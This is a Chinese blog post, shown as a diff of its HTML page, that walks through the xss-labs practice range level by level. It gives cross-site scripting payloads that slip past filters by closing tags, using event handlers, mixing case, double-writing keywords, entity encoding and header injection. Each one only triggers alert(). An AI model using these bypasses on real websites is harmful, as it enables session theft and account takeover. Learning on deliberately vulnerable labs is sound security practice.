@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="xss-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss-labs">
+<meta property="og:url" content="https://gudiffany.github.io/2023/02/25/11-03-32/index.html">
+<meta property="og:site_name" content="diffany">
+<meta property="og:description" content="xss-labs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-02-25T03:03:32.000Z">
+<meta property="article:modified_time" content="2023-02-25T14:10:36.565Z">
+<meta property="article:author" content="diffany">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://gudiffany.github.io/2023/02/25/11-03-32/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gudiffany.github.io/2023/02/25/11-03-32/","path":"2023/02/25/11-03-32/","title":"xss-labs"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>xss-labs | diffany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">diffany</p>
+      <i class="logo-line"></i>
+    </a>
+      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="diffany">
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友情链接"><a href="/friend/" rel="section"><i class="fa fa-sitemap fa-fw"></i>友情链接</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">xss-labs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">1.1.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.2.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.3.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">1.4.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number">1.5.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-number">1.6.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-number">1.7.</span> <span class="nav-text">level7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level8"><span class="nav-number">1.7.1.</span> <span class="nav-text">level8</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-number">1.8.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-number">1.9.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11"><span class="nav-number">1.10.</span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level12"><span class="nav-number">1.11.</span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level13"><span class="nav-number">1.12.</span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14"><span class="nav-number">1.13.</span> <span class="nav-text">level14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level15"><span class="nav-number">1.14.</span> <span class="nav-text">level15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level16"><span class="nav-number">1.15.</span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level17-20"><span class="nav-number">1.16.</span> <span class="nav-text">level17-20</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">diffany</p>
+  <div class="site-description" itemprop="description">一个努力学习的菜鸟</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/02/25/11-03-32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="xss-labs | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss-labs<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/xss-labs.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-25 11:03:32 / 修改时间：22:10:36" itemprop="dateCreated datePublished" datetime="2023-02-25T11:03:32+08:00">2023-02-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/02/25/11-03-32/" class="post-meta-item leancloud_visitors" data-flag-title="xss-labs" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>xss-labs</h1>
+<span id="more"></span>
+<h2 id="level1">level1</h2>
+<p>观察后直接再url上的test添加</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level2">level2</h2>
+<p>使用搜索框，输入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但是被过滤了一部分</p>
+<p>&lt; &gt; “ ”被过滤</p>
+<p>因此需要绕过</p>
+<p>查资料之后发现，&lt; &gt; “ ”被转化成实体html字符实体。</p>
+<p>但是，语句经过了一个input转化为文本，于是可以利用input闭合</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level3">level3</h2>
+<p>即使对input进行闭合，也无法绕过，依然会对&lt;&gt;等进行过滤</p>
+<p>于是需要有一个不用&lt;&gt;的语句</p>
+<p>查资料发现有以下几种</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick =&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+<p>点击事件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+<p>鼠标移入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onfocus=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure>
+<p>聚焦点击</p>
+<h2 id="level4">level4</h2>
+<p>单引号换成双引号即可</p>
+<h2 id="level5">level5</h2>
+<p>本题测试之后，首先过滤&lt;&gt;，还有在on，script中会插入_</p>
+<p>那么之前的方法都不能用了</p>
+<p>使用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(‘xss’);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>进行构造，发现&quot;&gt;留在了搜索框的后面，也就是说有url的注入</p>
+<p>可以用</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>100<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>进行构造</p>
+<h2 id="level6">level6</h2>
+<p>比较有趣的是，相比于level5，6少了一个对输入全小写的处理过程，于是可以用大小写绕过str_replace</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrEf</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>100<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="level7">level7</h2>
+<p>过滤script，href,因此需要新思路来看，由于是直接删除字段，那么根据sqli-labs的less25来看，对其进行双写即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrehreff</span>=<span class="string">javascrscriptipt:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>100<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="level8">level8</h3>
+<p>过滤script，href以及双引号，因此需要看一下源码，发现注入点有两个，其中一个直接放入<a></a>中的url中，于是直接用javascript:alert(‘xss’)同时逃过即可</p>
+<p>而在使用url时，会进行一次解码，所以用unicode编码绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#x006a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0076;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0063;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0069;</span><span class="symbol">&amp;#x0070;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x003a;</span><span class="symbol">&amp;#x0061;</span><span class="symbol">&amp;#x006c;</span><span class="symbol">&amp;#x0065;</span><span class="symbol">&amp;#x0072;</span><span class="symbol">&amp;#x0074;</span><span class="symbol">&amp;#x0028;</span><span class="symbol">&amp;#x0027;</span><span class="symbol">&amp;#x0078;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0073;</span><span class="symbol">&amp;#x0027;</span><span class="symbol">&amp;#x0029;</span></span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;</span><br></pre></td></tr></table></figure>
+<h2 id="level9">level9</h2>
+<p>需要具有<a target="_blank" rel="noopener" href="http://xn--p8su49ae8h">http://的字段</a></p>
+<p>于是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span>http://<span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span></span><br></pre></td></tr></table></figure>
+<p>加上<a target="_blank" rel="noopener" href="http://xn--zlr2k">http://即可</a></p>
+<h2 id="level10">level10</h2>
+<p>查看源码发现只有t_sort可以利用，但是在没有源码的情况下如何测试？</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_link=&quot; type=&quot;text&quot; &amp;t_history=&quot; type=&quot;text&quot; &amp;t_sort=&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
+<p>直接将其放入url发现只有t_sort有反应</p>
+<p>然后就可以直接构造payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=&quot; type=&quot;text” onmouseover=&quot;javascript:alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level11">level11</h2>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_link=&quot;type=&quot;text&amp;t_history=&quot;type=&quot;text&amp;t_sort=&quot;type=&quot;text&amp;t_ref=&quot;type=&quot;text</span><br></pre></td></tr></table></figure>
+<p>依然是t_sort有反应，把上一题的payload扔进去，发现”“转码了</p>
+<p>使用unicode试试，发现传不进去</p>
+<p>只能看源码了，发现直接跟refer有关，因此需要抓包了</p>
+<p>然后发现refer直接传到t_ref的value中</p>
+<p>于是可以直接构造</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level12">level12</h2>
+<p>在UA处进行注入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level13">level13</h2>
+<p>靶场好像出了一点点问题</p>
+<p>出现了不正常的warning，问题不大，看了源码后就可以直接发现是cookie</p>
+<h2 id="level14">level14</h2>
+<p>整个网页有问题没法做</p>
+<p>最终的payload为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>原理为img的链接不存在会直接执行报错语句</p>
+<h2 id="level15">level15</h2>
+<p>刚开始有一个404界面，删去src之后正常了</p>
+<p>那么src就是其中的一个注入点，看源码之后发现其中有一个ng-include:在body里面</p>
+<p>那么根据查了一下资料</p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">ng-include</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;expression&quot;</span> <span class="attr">autoscroll</span>=<span class="string">&quot;expression&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">element</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>ng-include 指令作为元素使用:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ng-include</span> <span class="attr">src</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;expression&quot;</span> <span class="attr">autoscroll</span>=<span class="string">&quot;expression&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">ng-include</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>也就是说可以利用同域名下的网页包含xss</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;100&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>但是没法成功</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>&#x27;</span><br><span class="line">?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(233)&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>上面都是可行的（不知道为什么）</p>
+<h2 id="level16">level16</h2>
+<p>过滤了空格和/</p>
+<p>可以用%0a,%0d代替</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc=2%0aonerror=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img%0dsrc=2%0donerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level17-20">level17-20</h2>
+<p>插件不支持(IE也只能支持17和18，19出bug)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b%20onmouseover=%27javascript:alert(1)%27</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>diffany
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gudiffany.github.io/2023/02/25/11-03-32/" title="xss-labs">https://gudiffany.github.io/2023/02/25/11-03-32/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/02/25/11-03-32/" rel="next" title="sqli-labs">
+                  sqli-labs <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diffany</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+
+
+  <script src="[object Object]"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+
+
+<script>
+var options = {
+  bottom: '64px', // default: '32px'
+  right: 'unset', // default: '32px'
+  left: '32px', // default: 'unset'
+  time: '0.5s', // default: '0.3s'
+  mixColor: '#fff', // default: '#fff'
+  backgroundColor: '#fff',  // default: '#fff'
+  buttonColorDark: '#100f2c',  // default: '#100f2c'
+  buttonColorLight: '#fff', // default: '#fff'
+  saveInCookies: true, // default: true,
+  label: '🌓', // default: ''
+  autoMatchOsTheme: true // default: true
+}
+const darkmode = new Darkmode(options);
+darkmode.showWidget();
+</script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://unpkg.com/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
